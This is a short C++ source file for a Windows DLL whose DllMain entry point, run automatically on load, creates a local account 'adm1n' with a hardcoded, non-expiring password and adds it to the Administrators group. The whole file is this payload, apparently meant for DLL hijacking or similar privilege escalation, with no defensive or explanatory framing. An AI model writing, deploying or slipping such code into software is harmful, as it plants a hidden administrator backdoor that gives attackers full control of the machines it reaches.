// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <lm.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "netapi32.lib")

wchar_t username[256] = L"adm1n";
wchar_t password[256] = L"P@ssw0rd";

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    // Create the user
    USER_INFO_1 user;
    memset(&user, 0, sizeof(USER_INFO_1));
    user.usri1_name = username;
    user.usri1_password = password;
    user.usri1_priv = USER_PRIV_USER;
    user.usri1_flags = UF_DONT_EXPIRE_PASSWD;
    NetUserAdd(NULL, 1, (LPBYTE)&user, NULL);

    // Add the user to the administrators group
    LOCALGROUP_MEMBERS_INFO_3 members;
    members.lgrmi3_domainandname = username;
    NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&members, 1);
}

